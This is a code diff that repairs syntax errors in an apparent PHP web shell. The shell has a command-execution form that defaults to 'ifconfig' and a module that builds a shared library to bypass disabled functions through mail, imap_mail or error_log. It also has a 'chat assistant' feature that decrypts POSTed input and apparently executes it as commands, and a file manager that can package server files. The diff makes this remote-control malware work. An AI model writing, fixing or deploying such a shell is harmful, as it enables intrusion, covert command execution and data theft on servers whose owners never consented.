@@ -80,7 +80,7 @@ class  StringHandler {
 	}
 }
 
-class  HtmlOutput _
+class  HtmlOutput {
 
 	public static function htmlOut ($data) {
 		echo "$data\n";
@@ -660,8 +660,8 @@ END;
 <style>.main-content{width:700px;padding-right:50px;margin:0 auto;}.tip{font-size:14px;line-height:26px;background-color:#f8f8f8;padding:10px 20px;color:#666;margin-bottom:20px;border-radius:4px;border:1px solid #ccc;}input[type=submit]{float:right;}select{margin-left:0;margin-right:20px;}.title{vertical-align:top;}textarea{margin-left:30px;width:573px;height:350px;font-size:14px;line-height:20px;}.result{margin-top:20px;}.result span{display:block;margin-bottom:10px;}</style>
 <div class="main-content"><div class="tip">This module only realizes the automatic generation of the 64-bit so file of the centos version. Please supplement the others by yourself. Name the so file you compiled as libsrc.so and put it in the same It can be called directly in the directory. The source code of the C program is as follows. Please modify it by yourself for other requirements. </div><form id="pform" method="post" action="?action=bszn">
 EOF;
-		$result   .= HtmlOutput :: htmlSelect ([ '1' => 'Use the mail function' , '2' => 'Use the imap_mail function' , '3' => 'Use the error_log function' , '4' => "Use md_send_mail function" ] , '' , '' , $name = 'type' );
-		$result   . = HtmlOutput :: htmlSelect ([ '1' => '32 位 ' , ' 2 ' => '64' ], '' , '' , $name = 'cpu' );
+		$result  .= HtmlOutput :: htmlSelect ([ '1' => 'Use the mail function' , '2' => 'Use the imap_mail function' , '3' => 'Use the error_log function' , '4' => "Use md_send_mail function" ] , '' , '' , $name = 'type' );
+		$result  .= HtmlOutput :: htmlSelect ([ '1' => '32 位 ' , ' 2 ' => '64' ], '' , '' , $name = 'cpu' );
 		$result  .= <<<EOF
 执行命令：<input id="command"  name="content" type="text" value="ifconfig"><input onclick="submitUrl()" type="submit" value="执行"></form>
 EOF;
@@ -834,7 +834,7 @@ STR;
 	}
 
 	public static function chatRobot () {
-		$res = 'I'm your smart chat assistant, ask me a question~' ;
+		$res = 'I\'m your smart chat assistant, ask me a question~';
 		$cmd = isset($GLOBALS['_POST']['content']) ? htmlspecialchars(Decrypt::run($GLOBALS['_POST']['content'])) : 'dir';
 		if (!empty($GLOBALS['_POST']['content'])) {
 			$res = self::DeMarcia(Decrypt::run($GLOBALS['_POST']['content']));
@@ -1192,7 +1192,7 @@ class FileHandler {
 	public function fileAction ($array , $type , $inver , $REAL_DIR) {
 		if (( $count = count ( $array )) == 0 ) return  'Please select a file' ;
 		if ($type == 'e') {
-			function listfiles ($dir = "." , $faisunZIP , $mydir) {
+			function listfiles($dir = "." , $faisunZIP , $mydir) {
 				$sub_file_num = 0;
 				if (is_file($mydir . "$dir")) {
 					if (realpath($faisunZIP->gzfilename) != realpath($mydir . "$dir")) {
@@ -1350,7 +1350,7 @@ class FileHandler {
 EOF;
 
 		$dir       = @dir ( $path ) ;
-		$REAL_DIR = self::(realpath($path));filePathFormat
+		$REAL_DIR = self::filePathFormat(realpath($path));
 
 		if (!empty($GLOBALS['_POST']['type'])) {
 			$result .= '<div class="main-content package">' . self::fileAction($GLOBALS['_POST']['files'] , $GLOBALS['_POST']['type'] , $GLOBALS['_POST']['inver'] , $REAL_DIR . '/') . '</div>';
